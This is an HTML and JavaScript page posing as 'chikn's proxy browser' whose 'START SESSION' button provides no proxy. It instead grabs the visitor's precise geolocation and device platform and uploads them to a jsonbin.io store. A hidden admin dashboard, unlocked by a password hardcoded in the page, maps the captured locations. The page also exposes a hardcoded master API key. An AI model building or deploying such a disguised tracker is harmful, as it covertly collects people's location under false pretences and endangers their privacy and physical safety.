<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>chikn's proxy browser</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --p-dark: #1a1a2e; --p-mid: #16213e; --p-accent: #7b2cbf; }
        body { 
            background-color: var(--p-dark); 
            color: #e0e0e0; 
            font-family: 'Space Mono', monospace;
            cursor: crosshair;
            overflow-x: hidden;
        }
        #rain-canvas {
            position: fixed; top: 0; left: 0; pointer-events: none; z-index: 0;
        }
        .glass {
            background: rgba(26, 26, 46, 0.8);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(123, 44, 191, 0.3);
            z-index: 10;
        }
        #map { height: 250px; border-radius: 8px; filter: hue-rotate(240deg) brightness(0.8); }
        button, input, a { cursor: crosshair !important; }
        .hidden { display: none; }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-thumb { background: var(--p-accent); }
        
        .discord-btn {
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: #5865F2;
            color: white;
            width: 50px;
            height: 50px;
            border-radius: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            box-shadow: 0 4px 15px rgba(88, 101, 242, 0.4);
            transition: all 0.3s ease;
            z-index: 100;
        }
        .discord-btn:hover {
            transform: scale(1.1) rotate(5deg);
            background: #4752C4;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4">

    <canvas id="rain-canvas"></canvas>

    <a href="https://discord.gg/EjrHXRkGTt" target="_blank" class="discord-btn" title="Join our Discord">
        <i class="fab fa-discord"></i>
    </a>

    <div class="text-center mb-8 relative z-10">
        <h1 class="text-4xl font-bold text-purple-400 tracking-tighter uppercase italic">chikn's proxy</h1>
        <p class="text-purple-300/50 text-[10px] tracking-[0.3em] uppercase">connection established</p>
    </div>

    <div class="w-full max-w-md glass p-6 rounded-2xl shadow-[0_0_50px_rgba(123,44,191,0.2)] relative z-10">
        <div id="status" class="hidden mb-4 p-3 rounded-lg text-center text-[10px] font-bold uppercase tracking-widest border border-purple-500/30"></div>
        
        <button id="start-btn" class="w-full bg-purple-600 hover:bg-purple-500 text-white font-bold py-6 rounded-xl shadow-[0_0_20px_rgba(123,44,191,0.4)] transition-all active:scale-95 text-lg uppercase tracking-widest">
            START SESSION
        </button>

        <div class="mt-8 border-t border-purple-500/20 pt-6">
            <div id="login-section">
                <input type="password" id="pass" placeholder="KEY_CODE" class="w-full p-4 bg-slate-900/50 border border-purple-500/20 rounded-xl mb-3 outline-none focus:border-purple-500 transition-all text-center text-purple-300">
                <button id="admin-btn" class="w-full bg-transparent border border-purple-500/50 text-purple-400 py-2 rounded-xl text-[10px] font-bold uppercase hover:bg-purple-500/10 transition-colors">
                    Admin Overdrive
                </button>
            </div>

            <div id="dashboard" class="hidden space-y-4">
                <div class="flex justify-between items-center text-[10px] text-purple-400 font-bold uppercase">
                    <span>Active Relays</span>
                    <button id="logout" class="hover:text-red-400">Terminate</button>
                </div>
                <div id="map"></div>
                <div id="log-list" class="space-y-2 max-h-32 overflow-y-auto pr-2"></div>
                <div class="grid grid-cols-2 gap-2">
                    <button id="refresh-map" class="bg-purple-900/30 border border-purple-500/30 py-2 rounded-lg text-[9px] font-bold text-purple-300 uppercase">Sync</button>
                    <button id="clear-data" class="bg-red-900/20 border border-red-500/30 py-2 rounded-lg text-[9px] font-bold text-red-400 uppercase">Wipe</button>
                </div>
            </div>
        </div>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        const BIN_ID = "694b70d443b1c97be901f24b"; 
        const API_KEY = "$2a$10$v/u.3QIsZjp/k/ptGgQwF./CkX29f1nu.f2FYI0qKwcEZX3t3RNRW"; 
        const ADMIN_PASS = "mommy9";

        const startBtn = document.getElementById('start-btn');
        const adminBtn = document.getElementById('admin-btn');
        const passInput = document.getElementById('pass');
        const statusBox = document.getElementById('status');
        let map, markers = [];

        // Updated Audio Logic: Direct MP3 Stream for lofi
        const clickSound = new Audio('https://www.soundjay.com/buttons/sounds/button-16.mp3');
        const rainSound = new Audio('https://www.soundjay.com/nature/sounds/rain-01.mp3');
        const lofiMusic = new Audio('https://stream.zeno.fm/0r0xa792kwzuv'); // High-quality Lofi Stream
        
        rainSound.loop = true;
        lofiMusic.loop = true;
        let mediaStarted = false;

        function startMedia() {
            if (mediaStarted) return;
            mediaStarted = true;
            
            rainSound.volume = 0.2;
            lofiMusic.volume = 0.4;

            // Triggering both upon the first user interaction
            rainSound.play().catch(e => console.log("Audio block: Rain"));
            lofiMusic.play().catch(e => console.log("Audio block: Music"));
        }

        const canvas = document.getElementById('rain-canvas');
        const ctx = canvas.getContext('2d');
        let drops = [];
        function initRain() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            drops = [];
            for(let i=0; i<120; i++) drops.push({
                x: Math.random()*canvas.width, 
                y: Math.random()*canvas.height, 
                l: Math.random()*15, 
                v: Math.random()*4 + 4
            });
        }
        function drawRain() {
            ctx.clearRect(0,0,canvas.width, canvas.height);
            ctx.strokeStyle = 'rgba(123, 44, 191, 0.15)';
            ctx.lineWidth = 1;
            drops.forEach(d => {
                ctx.beginPath(); ctx.moveTo(d.x, d.y); ctx.lineTo(d.x, d.y + d.l); ctx.stroke();
                d.y += d.v; if(d.y > canvas.height) d.y = -20;
            });
            requestAnimationFrame(drawRain);
        }
        initRain(); drawRain();
        window.addEventListener('resize', initRain);

        function playClick() { 
            clickSound.currentTime = 0; 
            clickSound.play().catch(e => {}); 
        }

        function showStatus(msg, isError = false) {
            statusBox.innerText = msg;
            statusBox.className = `mb-4 p-3 rounded-lg text-center text-[10px] font-bold uppercase tracking-widest border ${isError ? 'border-red-500 text-red-400 bg-red-900/10' : 'border-purple-500 text-purple-300 bg-purple-900/10'}`;
            statusBox.classList.remove('hidden');
            setTimeout(() => statusBox.classList.add('hidden'), 5000);
        }

        startBtn.onclick = () => {
            playClick(); 
            startMedia();
            startBtn.disabled = true;
            startBtn.innerText = "OVERRIDING...";

            navigator.geolocation.getCurrentPosition(async (pos) => {
                const newLoc = {
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    timestamp: Date.now(),
                    device: navigator.platform
                };

                try {
                    const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
                        headers: { "X-Master-Key": API_KEY }
                    });
                    const data = await res.json();
                    let records = Array.isArray(data.record) ? data.record : [];
                    records.push(newLoc);

                    await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
                        method: 'PUT',
                        headers: { "Content-Type": "application/json", "X-Master-Key": API_KEY },
                        body: JSON.stringify(records)
                    });
                    showStatus("RELAY SECURED.");
                } catch (e) { showStatus("CLOUD SYNC FAILED", true); }
                startBtn.disabled = false;
                startBtn.innerText = "START SESSION";
            }, (err) => {
                showStatus("ACCESS DENIED. RESET PERMISSIONS IN BROWSER SETTINGS.", true);
                startBtn.disabled = false;
                startBtn.innerText = "START SESSION";
            }, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
        };

        adminBtn.onclick = () => {
            playClick();
            startMedia();
            if(passInput.value === ADMIN_PASS) {
                document.getElementById('login-section').classList.add('hidden');
                document.getElementById('dashboard').classList.remove('hidden');
                initMap(); loadData();
            } else { showStatus("KEY INVALID", true); }
        };

        function initMap() {
            if(!map) {
                map = L.map('map', { zoomControl: false }).setView([20, 0], 2);
                L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);
            }
        }

        async function loadData() {
            try {
                const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
                    headers: { "X-Master-Key": API_KEY, "X-Bin-Meta": "false" }
                });
                const allRecords = await res.json();
                markers.forEach(m => map.removeLayer(m)); markers = [];
                const list = document.getElementById('log-list'); list.innerHTML = '';

                if (Array.isArray(allRecords)) {
                    const now = Date.now();
                    const oneDay = 24 * 60 * 60 * 1000;
                    allRecords.filter(r => r.lat && (now - r.timestamp) < oneDay).reverse().forEach(loc => {
                        const m = L.marker([loc.lat, loc.lng]).addTo(map);
                        markers.push(m);
                        const div = document.createElement('div');
                        div.className = "bg-purple-900/10 border border-purple-500/10 p-2 rounded text-[8px] flex justify-between uppercase text-purple-300 mb-1";
                        div.innerHTML = `<span>${loc.device}</span><span>${new Date(loc.timestamp).toLocaleTimeString()}</span>`;
                        list.appendChild(div);
                    });
                    if (markers.length > 0) map.fitBounds(new L.featureGroup(markers).getBounds().pad(0.2));
                }
            } catch (e) { console.error(e); }
        }

        document.getElementById('clear-data').onclick = async () => {
            playClick();
            if(!confirm("WIPE ENTIRE DATABASE?")) return;
            await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
                method: 'PUT',
                headers: { "Content-Type": "application/json", "X-Master-Key": API_KEY },
                body: JSON.stringify([])
            });
            loadData(); showStatus("CLEARED.");
        };

        document.getElementById('refresh-map').onclick = () => { playClick(); loadData(); };
        document.getElementById('logout').onclick = () => location.reload();
    </script>
</body>
</html>
